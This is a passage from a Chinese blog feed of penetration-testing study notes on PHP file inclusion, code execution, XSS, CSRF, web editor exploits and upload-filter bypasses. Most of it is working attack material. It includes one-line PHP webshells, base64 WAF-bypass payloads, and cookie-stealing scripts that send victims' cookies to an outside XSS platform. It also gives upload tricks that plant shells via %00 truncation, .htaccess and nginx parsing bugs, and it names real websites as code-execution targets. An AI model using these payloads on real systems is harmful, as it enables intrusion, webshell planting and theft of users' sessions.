1234&apos;);测试一下nc反弹shell的利用,成功php://input将文件包含漏洞变成代码执行漏洞文件中存在包含漏洞的代码&lt;?php @include($_GET[&quot;file&quot;])?&gt;使用php://input,将执行代码通过Firefox的hacker在POST data中提交&lt;?php system(&apos;ifconfig&apos;);?&gt;data URI schema将文件包含漏洞变成代码执行漏洞并绕过360网站卫士的WAF在实施的时候,我突然想到,文件包含漏洞,在读取php文件时,是不能显示文件内容的.而很多情况,我们是急需读取php格式的配置文件,例如:dedecms数据库配置文件data/common.inc.phpdiscuz全局配置文件config/config_global.phpphpcms配置文件caches/configs/database.phpphpwind配置文件conf/database.phpwordpress配置文件wp-config.php读取指定文件FileInclude.php的代码&lt;?php system(&apos;cat/var/www/FileInclude.php&apos;)?&gt;然后将攻击代码转化成data:URIdata:text/plain,&lt;?php system(&apos;cat/var/www/FileInclude.php&apos;)?&gt;注意,我们看到转化后的GET请求的参数中包含&lt;?的标记,在遇到有些WAF,包括云WAF(例如360网站卫士),就会将其视为攻击代码,阻挡下来.于是我们需要做一下编码处理data:text/plain;base64,[攻击代码的base64编码]php://filter在文件包含漏洞中的利用读取php文件源码内容用法:php://filter/read=convert.base64-encode/resource=[文件路径]将得到的base64的数据解码得出php文件内容代码执行漏洞:代码执行函数php中可以执行代码的函数.如eval(),assert(),&apos;&apos;,system(),exec(),shell_exec(),passthru(),escapeshellcmd(),pcntl_exec()等.reg:&lt;?php eval($_POST[cc123])?&gt;@是错误抑制符,防止小错误的,写不写都一样动态代码执行:&lt;?php$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];$a($b);?&gt;http://127.0.0.1/x.php?a=system&amp;b=ipconfiga=assert&amp;b=phpinfo();执行系统命令ipconfig可变变量是可以绕狗的命令执行函数:在php中您可以使用下列5个函数来执行外部的应用程序或函数1.system:执行一个外部的应用程序并显示输出的结果2.exec:执行一个外部的应用程序3.passthru:执行一个UNIX系统命令并显示原始的输出4.shell_exec:执行shell命令并返回输出的结果的字符串5.&quot;&apos;&apos;&quot;运算符:与shell_exec函数的功能相同system函数使用&lt;?$cmd=$_GET[&quot;cmd&quot;];echo&quot;&lt;pre&gt;&quot;;system($cmd);echo&quot;&lt;/pre&gt;&quot;;?&gt;http://127.0.0.1/sys.php?cmd=ipconfigshell_exec函数&lt;?php$x=$_GET[&apos;x&apos;];echo shell_exec($x);?&gt;http://127.0.0.1/x.php?x=ipconfig代码执行 实例http://www.77dvd.com/http://www.bgdyhd.com/http://www.bgdyhd.com/search.php?searchtype=5&amp;tid=&amp;area=phpinfo()海洋cms代码漏洞变量覆盖漏洞产生:变量如果未初始化,且能被用户所控制在php中,若register_globals为on时尤其严重此为全局变量覆盖漏洞当register_global=ON时,变量来源可能是各个不同的地方,比如页面的表单,Cookie等.&lt;?php$auth=&apos;0&apos;;extract($_GET);if($auth==1){echo&quot;登录成功!&quot;;}else{echo&quot;您还没有登录,请重新登录!&quot;;}?&gt;http://127.0.0.1/bian.php?auth=1</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;php相关漏洞
jsp相关漏洞
其他漏洞汇总

php相关漏洞:
    文件包含漏洞
    php://input等伪协议利用
    代码执行漏洞
    变量覆盖漏洞

    文件包含:
    程序开发人员一般会把重复使用的函数写到单个文件中,需要使用某个函数时直接调用此文件
    而无需再次编写,这种文件调用的过程一般被称为包含.
    程序开发人员一般希望代码更灵活,所以将被包含的文件设置为变量,用来进行动态调用.
    但正是由于这种灵活性,从而导致客户端可以调用一个恶意软件,造成文件包含漏洞.
    几乎所有脚本语言都会提供文件包含的功能,但文件包含漏洞在PHP Web Application中居多.
    而在JSP,ASP,ASP.NET程序中却非常少,甚至没有,这是有些语言设计的弊端.
    在PHP中经常出现包含漏洞,但这并不意味着其他语言不存在.
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记21-xssANDcsrf漏洞</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B021-xssANDcsrf%E6%BC%8F%E6%B4%9E/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记21-xssANDcsrf漏洞/</id>
    <published>2018-09-10T23:30:50.000Z</published>
    <updated>2018-09-10T15:31:29.133Z</updated>
    
    <content type="html"><![CDATA[<pre><code>存储型XSS:必须要写入到数据库中,再调用这个页面一般在留言板多一些.盲打cookie&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;textarea&gt;可能闭合影响后台,不闭合影响前台http-only相当于对认证的cookie进行一次加密留言的话DZ是在发表-&gt;下面的抢楼-&gt;alert(document.cookie)弹cookie之后,发现没有auth这个cookie需要用一个js代码,在http-only实验里面有个o.js和save.php</code></pre><a id="more"></a>    <pre><code>使用:1.将&quot;全部去掉 2.将:换成= 3.将,换成; 4.将+换成%2B&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script src=&quot;http://127.0.0.1/o.js&quot;&gt;&lt;/script&gt;save.php-&gt;(用来接收cookie的)&lt;?php$a = $_GET[&quot;opener&quot;];$file = fopen(&quot;test_xxx.txt&quot;,&quot;w+&quot;);echo fwrite($file,$a);fclose($file);?&gt;o.js-&gt;(传递cookie)alert(JSON.stringify(cookie_dict));    x.src=&apos;http://localhost/save.php?opener=&apos;+JSON.stringify(cookie_dict);或者是:&lt;script&gt;    var cookie=document.cookie;    var url=&quot;http://127.0.0.1/cookie.php?x=&quot;;    windows.location.href=url+cookie;&lt;/script&gt;XSS平台搭建:zkeys包含支持php和mysql用phpinfo()来确认IIS是否搭建成功sql要在后台添加进去,config的url指向要写自己的ip权限-&gt;右键-&gt;属性-&gt;安全-&gt;添加-&gt;输入e,就添加了Everyone建立index,注册,然后默认模块-&gt;keepsession搭好后还需要重写一下url安装ISAPI,然后绿色版直接全部copy到安装目录打开,XSS站点,然后edit-&gt;Apply,就搭成功了.要用邀请码的,需要把config里的注册配置的normal改成invite然后再配置UPDATE的adminLevel = &quot;1&quot;,在后台里面编辑一个用户改成&quot;1&quot;就行了这个是单人用的在文件下载-&gt;BlueLotus_XSSReceiver_master.zip解压到网站路径http://localhost就能找到留后门就是js写的src指向,最好写在oclick里面csrf跨站请求伪造攻击CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。可以通过url来提交的,基本都可能存在csrf将post改为get提交的办法:抓包,http://Host+POST+&amp;+底下的cookie-&gt;Drop取消代理复制get提交到url,回车,就能创建成功了然后怎么伪造呢,xx.html,里面是&lt;img src=&quot;&quot;&gt;csrf有防护机制的,一般是referer防护的referer主要是用来判断提交的页面是否合法的Enable Referer,告诉它是从这个页面跳过来的,然后url+index.php,就能得到返回值了</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;存储型XSS:
必须要写入到数据库中,再调用这个页面
一般在留言板多一些.盲打cookie
&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;lt;textarea&amp;gt;
可能闭合影响后台,不闭合影响前台


http-only
相当于对认证的cookie进行一次加密
留言的话DZ是在发表-&amp;gt;下面的抢楼-&amp;gt;alert(document.cookie)
弹cookie之后,发现没有auth这个cookie
需要用一个js代码,在http-only实验里面有个o.js和save.php
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记20-xss漏洞</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B020-xss%E6%BC%8F%E6%B4%9E/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记20-xss漏洞/</id>
    <published>2018-09-10T23:29:40.000Z</published>
    <updated>2018-09-10T15:30:15.496Z</updated>
    
    <content type="html"><![CDATA[<pre><code>xss是一个强漏洞XSS（cross-site script）跨站脚本自1996年诞生以来，一直被OWASP(open web application security project) 评为十大安全漏洞中的第二威胁漏洞。也有黑客把xss当做新型的“缓冲区溢出攻击”，而JavaScript是新型的shellcode。2011年6月份，国内最火的信息发布平台“新浪微博”爆发了xss蠕虫攻击，仅持续16分钟，感染用户近33000个，危害十分严重。xss最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。其实就是执行一段恶意js代码************OWASP(一定要记住)    --开放web应用安全项目按照owasp执行</code></pre><a id="more"></a>    <pre><code>用多种浏览器去查看/调试,用穿山甲payload利用攻击载荷cookie:存放在本地的cookie中通过cookie来欺骗浏览器,访问登录之后的页面反射型,也称非持久型,DOM也属于反射型存储型挖掘:1.手工挖 2.利用工具大小写特殊字符特殊编码引用其他JS语句穿山甲-&gt;XSS编码-&gt;过过滤&apos;或者&quot;之类的火狐插件-&gt;Hackbar,FireBug,Tamper Data,Live HTTP Headers,Editor Cookie如何获取cookie,管理页面不知密码-&gt;document.coookie弹窗或者发送到xss平台,将接收cookie的代码写进HTML里面去穿山甲-&gt;工具-&gt;tamper Data-&gt;start tamper拦截来抓包-&gt;还可以AddHTTP头-&gt;Replay(重新发送包)Editor Cookie就是穿山甲右侧-&gt;Cookies Manager+漏洞一般会出现在数据交互的地方:reg:登录,评论,留言,搜索&lt;textarea&gt;&lt;script&gt;alert(/xx/)&lt;/script&gt;&lt;/textarea&gt;百度的漏洞存在客户端上百度网盘-&gt;左侧名称-&gt;修改不超过10个字符左右,然后抓包,burp插入JS代码就修改成功了,如果插入cookie,用户在线保存的话就会中招.CSDN漏洞在我的博客-&gt;留言板上常见的payload....漏洞分析-&gt;bruteXSS   运行用python运行运行用bruteXSS.py..加载payload列表,去暴力破解G/P:GET or POSTGURL:xxx.asp?keyword= 使用默认列表 ENTERPayload: &lt;/script&gt;&quot;&gt;....   复制就行 放到URL后面执行一下漏洞利用-&gt;OWASP(这个工具厉害一点)-&gt;打开 Settings-&gt;Configure Server-&gt;StartScanner-&gt;GET-&gt;复制URL-&gt;将下面的X复制放在URL后面-&gt;Fuzz成功后会弹框payload在上方URL里面Scanner-&gt;POST-&gt;URL,,,Parameters写payload后面的-&gt;FuzzDom也是工具:Mantra$x=preg_replace(“/script/”,””,$x);$x=preg_replace(“/script/i”,””,$x); //加i的是不区分大小写的常见的防xss代码,接收回来的/scipt/替换为空http://xxx/xx?x=&lt;body ...&gt;  //x是get过去的变量x(注:手工调试尽量用火狐浏览器)绕过方式:1.大小写替换,,reg:scRipt2.&lt;img src=1 onerror=&quot;alert(/xss/)&quot;&gt;3.&lt;body onload=&quot;alert(/xss/)&gt;4.如果替换掉alert,就换别的试一下.reg:可以先编码,用Mantra-&gt;XSS-&gt;String.fromCharCode()-&gt;onload=&quot;eval(String.fromCharCode(97,108,...就是alert编码))&quot;选中alert(/xss/)然后XSS-&gt;alert..替换成编码\u003c\u003e    代表&lt;&gt;\u003cimg src=1 onerror=alert(/xss/)\u003e-&gt;/xss/改成_key_cookie获取:反射型XSS:网址:XSS Platformhttp://pip3.win/xss.php?do=project&amp;act=viewcode&amp;ty=create&amp;id=16reg:假如说发现一个网址的搜索有弹窗,就复制整个url,将弹窗内容改为下面这个&lt;sCRiPt sRc=http://pip3.win/qtCa&gt;&lt;sCrIpT&gt;必须是在登录了后台系统之后的页面输入url,再发送到然后XSS平台-&gt;test-&gt;复制cookie,找到这个登录后台的login,然后打开漏洞利用-&gt;马哥-&gt;url下面那一段将cookie复制,然后点击强行修改cookie可以放在x.html里面&lt;img src=&quot;url复制过来&quot;&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;xss是一个强漏洞

XSS（cross-site script）跨站脚本自1996年诞生以来，一直被OWASP(open web application security project) 评为十大安全漏洞中的第二威胁漏洞。也有黑客把xss当做新型的“缓冲区溢出攻击”，而JavaScript是新型的shellcode。
2011年6月份，国内最火的信息发布平台“新浪微博”爆发了xss蠕虫攻击，仅持续16分钟，感染用户近33000个，危害十分严重。
xss最大的特点就是能注入恶意的代码到用户浏览器的网页上，从而达到劫持用户会话的目的。


其实就是执行一段恶意js代码
************OWASP(一定要记住)    --开放web应用安全项目
按照owasp执行
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记19-编辑器</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B019-%E7%BC%96%E8%BE%91%E5%99%A8/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记19-编辑器/</id>
    <published>2018-09-10T23:25:20.000Z</published>
    <updated>2018-09-10T15:25:50.119Z</updated>
    
    <content type="html"><![CDATA[<pre><code>常见编辑器漏洞详解FCKeditor编辑器利用EWEBeditor编辑器利用其他类型编辑器的利用编辑器利用:南方:-&gt;southidceditoreweb(一般在根目录或者管理员目录下)ckeditorfckckfinder</code></pre><a id="more"></a>    <pre><code>信息搜集-&gt;御剑搜到后会有一个eweb...目录,,也可能叫edit,editor信息搜集-&gt;caidao  去爬取UploadFiles.百度搜索:inurl:fckeditor /*site:xxx.com*/漏洞利用-&gt;Fckeidtor*****自己写安全工具一定不要外传,是犯法的.Fckeidtor上传的话,一定要有反应才行.1.asp;jpg-&gt;上传成功后复制链接-&gt;访问-&gt;找到图片的地址,然后访问.小迪版本-&gt;上传地址2如果弹窗的话就不能使用了上传地址3-&gt;上传上去&quot;.&quot;就换成下划线的就用突破建立文件夹:(这段代码其实就是抓的包)FCKeditor_2.5/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/xx.asp&amp;NewFolderName=x.asp第一行:        %2F就是一个 &quot;/&quot;  将%2F 替换成 aa.asp2.6版本 用 %2Fxx.php%00截断.(在URL里面不需要转换)jsp用K8的FCKEWEB编辑器:它有独立的后台,与网站的后台无关./ewebeditor/1.进EWEB后台2.找后台 admin_style.asp3.登陆:(1)默认密码(2)下载mdb数据库(3)burp加载字典爆破(4)注入可以加个%23ewebeditor.mdb ,然后下载数据管理-&gt;DatabaseBrow...(也就是辅臣数据库浏览器)信息收集-&gt;御剑-&gt;找有eweb的url然后sqlmap跑这个网址   ,如果已经知道数据库名的,就加载到字典里面,在python27-&gt;sqlmap-&gt;txt里面找(还可以用穿山甲)蚂蚁神盾???跟警方合作???(什么乱七八糟的)aaspsp这样的写法是要过滤掉中间的asp有时候按钮不好使是浏览器兼容性的问题漏洞分析-&gt;ietester-&gt;这个是低版本的测试浏览器没有后台就找列目录漏洞如果能找到admin_uploadfile.asp的话就:editor/admin_uploadfile.asp?id=&amp;dir=../..来列目录构造上传:寻找到在数据库里面改好的上传后缀的idform-&gt;?style=&quot;改好的id&quot;ckfinder:/ckfinder/ckfinder.html右击创建子目录,上传文件,右击-&gt;查看元素就可以shell了解析漏洞.</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;常见编辑器漏洞详解

FCKeditor编辑器利用
EWEBeditor编辑器利用
其他类型编辑器的利用


编辑器利用:

南方:-&amp;gt;southidceditor
eweb(一般在根目录或者管理员目录下)
ckeditor
fck
ckfinder
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试学习笔记18-上传漏洞详解</title>
    <link href="prayer007007.github.io/2018/09/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B018-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    <id>prayer007007.github.io/2018/09/11/渗透测试学习笔记18-上传漏洞详解/</id>
    <published>2018-09-10T23:24:21.000Z</published>
    <updated>2018-09-10T15:24:49.277Z</updated>
    
    <content type="html"><![CDATA[<pre><code>上传漏洞详解:文件解析漏洞上传本地验证绕过上传服务器验证绕过文件解析漏洞:解析漏洞主要说的是一些特殊文件被iis,apache,nginx在某种情况下解释成脚本文件格式的漏洞</code></pre><a id="more"></a>    <pre><code>IIS 5.x/6.0解析漏洞(比较老)IIS 6.0解析利用方法有两种1.目录解析/xx.asp/xx.jpg在网站下建立文件夹的名字为.asp,.asa的文件夹,其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行例如创建目录cracer.asp,那么/cracer.asp/1.jpg将被当作asp文件夹来执行.假设黑阔可以控制上传文件夹路径,就可以不管你上传后你的图片改不改名都能拿shell了.2.文件解析cracer.asp;.jpg第二种,在IIS6.0下,分号后面的不被解析,也就是说cracer.asp;.jpg (卡上去是图片格式,但是上传后是.asp格式)会被服务器看成是wooyun.asp还有IIS6.0默认的可执行文件除了asp还包含这三种/cracer.asa/cracer.cer/cracer.cdxIIS 5.x是2000  6.0是2003  7.5是2008Apache解析漏洞Apache是从右到左开始判断解析,如果为不可识别解析,就再往左判断.比如cracer.php.owf.rar &quot;.owf&quot;和&quot;.rar&quot;这两种后缀是apache不可识别解析,apache就会把cracer.php.owf.rar解析成php如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个cracer.php.rara.jpg.png...(把你知道的常见后缀都写上...)去测试是否是合法后缀任意不识别的后缀,逐级向上识别.IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞Nginx解析漏洞这个伟大的漏洞是我国安全组织80sec发现的在默认Fast-CGI开启状态下,黑阔上传一个名字为cracer.jpg,内容为&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt;的文件,然后访问cracer.jpg/.php,在这个目录下就会生成一句话木马shell.phpwww.xxx.com/logo.gif/*.php触发漏洞(有漏洞会把前面文件当作php执行)x.asp00jieduan%jpg    //a.php%00.jpga.aspx.a;a.aspx.jpg..jpg第二种解析漏洞或者直接上传xx.asp微信互刷平台,以前存在过这个漏洞.Nginx&lt;8.03空字节代码执行漏洞影响版:0.5,0.6,0.7&lt;=0.7.65,0.8&lt;=0.8.37Nginx在图片中嵌入PHP代码然后通过访问xxx.php%00.jpg来执行其中的代码htaccess文件解析如果在Apache中.htaccess可被执行,且可被上传,那可以尝试在.htaccess中写入:&lt;FilesMatch &quot;shell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;然后再上传shell.jpg的木马,这样shell.jpg就可解析为php文件上传本地验证绕过上传检测流程概述:通常一个文件以HTTP协议进行上传时,将以POST请求发送至web服务器,web服务器接收到请求并同意后,用户与web服务器将建立连接,并传输data服务器命名规则:第一种类型:上传文件名和服务器命名一致第二种类型:上传文件名和服务器命名不一致(随机,时间日期命名等)(reg:a.asp-&gt;a.jpg/201702281211111.jpg)常见的上传检测方式:1.客户端JavaScript检测(通常为检测文件扩展名)2.服务端MIME类型检测(检测Content-Type内容)3.服务端目录路径检测(检测跟path参数相关的内容)4.服务端文件扩展名检测(检测跟文件extension相关的内容)5.服务端文件内容检测(检测内容是否合法或含有恶意代码)客户端检测绕过(JavaScript检测)首先判断JS本地验证通常可以根据它的验证警告弹框的速度可以判断,如果你电脑运行比较快,那么我们可以用burp抓包,在点击提交的时候burp没有抓到包,就已经弹框那么说明这个就是本地js验证绕过方法:1.使用burp抓包改名2.使用firebug直接删掉本地验证的js代码3.添加js验证的白名单如将php的格式添加进去.选择完文件,点击上传之后,没经过网络就弹框的,就是本地如果是本地验证的话,用mantra修改js然后再上传先用.jpg,上传抓包,然后burp再改回.php,然后forward.因酷教育WordPress客户端白名单绕过修改允许上传的类型上传服务器端验证绕过服务端检测绕过(MIME类型检测)MIME的作用:使客户端软件,区分不同种类的数据,reg:web浏览器就是通过MIME类型来判断文件是GIF图片,还是可打印的PostScript文件web服务器使用MIME来说明发送数据的种类,web客户端使用MIME来说明希望接收到的数据种类.Tomact的安装目录\conf\web.xml中就定义了大量MIME类型,你可以去看一下绕过方法:直接使用burp抓包,得到post上传数据后,将Content-Type:text/plain改成Content-Type:image/gif就可以成功绕过Zwell通用图片上传服务端检测绕过(目录路径检测)目录路径检测,一般就检测路径是否合法,但稍微特殊一点的都没有防御,比如比较新的fckeditor php&lt;=2.6.4 任意文件上传漏洞当POST下面的URL的时候/fckeditor 264/filemanager/connectors/php/connector.php?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=fuck.php%00.gif HTTP/1.0CurrentFolder 这个变量的值会传到ServerMapFolder($resourceType,$folderPath,$sCommand)中的形参$folder里,而$folder在这个函数中并没有做任何检测,就被CombinePaths()了修改文件上传路径http://www.upload.com/tcnet/Admin_Login.aspforward-&gt;快捷键(ctrl+R)-&gt;RepeaterIIS6.0:reg:乱码中如果有JFIF,说明已经解析成功了filepath路径修改绕过可以用来突破自动命名规则xxxxx.gif一,改变文件上传后的路径/a.asp/ 需要一定的创建权限,不一定能...成功创建后为/a.asp/xxx.gif二,直接改变文件名称/a.asp;.修改后为/a.asp;.xxxx.gif服务器端检测绕过(文件扩展名检测)黑名单检测黑名单的安全性比白名单的安全性低很多,攻击手法自然也比白名单多,一般有个专门的blacklist文件,里面会包含常见的危险脚本文件例如:fckeditor 2.4.3或之前版本的黑名单白名单检测白名单相对来说比黑名单安全 一些,也不绝对安全绕过黑名单1.文件名大小写绕过用像AsP,pHp之类的文件名绕过黑名单检测2.名单列表绕过用黑名单里没有的名单进行攻击,比如黑名单里没有asa或者cer之类的3.特殊文件名绕过比如发送的http包里把文件名改成test.asp或test.asp(下划线为空格),这种命名方式在windows系统里是不被允许的,所以需要在burp之类里进行修改,然后绕过验证后,会被windows系统自动去掉后面的点和空格,但要注意Unix/Linux系统没有这个特性4.0x00截断绕过在扩展名检测这一块目前我只遇到过asp的程序有这种漏洞,给个简单的伪代码name=getname(httprequest)//加入这时候获取到的文件名是test.asp.jpg(asp后面为0x00)type=gettype(name)//而在gettype()函数处理方式是从后往前扫描扩展名,所以判断为.jpgif(type==jpg)5..htaccess文件攻击配合名单列表绕过,上传一个自定义的.htaccess,就可以轻松绕过各种检测6.解析调用/漏洞绕过这类漏洞直接配合上传一个代码注入过的非黑名单即可,再利用解析调用/漏洞burp-&gt;intruder-&gt;2p.${jpg}Payloads-&gt;加载后缀字典.00截断:2p.php%00(ctrl+shift+u).jpgphpweb存在%00漏洞绕过白名单1.0x00截断绕过用像test.asp?%00.jpg的方式进行截断.属于白名单文件,再利用服务端代码的检测逻辑漏洞进行攻击,目前我只遇到过asp的程序有这种漏洞2.解析调用/漏洞绕过这类漏洞直接配合上传一个代码注入过的白名单文件即可,再利用解析调用/漏洞-.htaccess文件攻击通过一个.htaccess文件调用php的解析器去解析一个文件名中只要包含&quot;haha&quot;这个字符串的任意文件,所以无论文件名是什么样子,只要包含&quot;haha&quot;这个字符串,都可以被以php的方式来解析,是不是相当邪恶,一个自定义的.htaccess文件就可以以各种各样的方式去绕过很多上传验证机制.建一个.htaccess文件,里面的内容如下:&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;同目录有个我们上传一个只有文件名并包含字符串&quot;haha&quot;.但是却无任何扩展名的文件里面的内容是php一句话木马双文件上传南方,良精,动易...文件上传,repeater-&gt;复制cookie,复制到--------------------------然后粘贴到后面name=&quot;Filename2&quot; 后缀改成2p.cer如果文件内容检测设置得比较严格,那么上传攻击将变得非常困难,也可以说它是在代码层检测的最后一道关卡,如果它被突破了,就算没有代码层的漏洞,也给后面利用应用层的解析漏洞带来了机会.绕过检测文件头主要是检测文件内容开始处的文件幻数,比如图片类型的文件幻数如下:要绕过jpg文件幻数检测就要在文件开头写下方的值Value=FF D8 FF E0 00 10 4A 46 49 46offset       1   2...000000000   FF   D8...                JFIF要绕过gif文件幻数检测就要在文件开头写下方的值Value=47 49 46 38 39 61                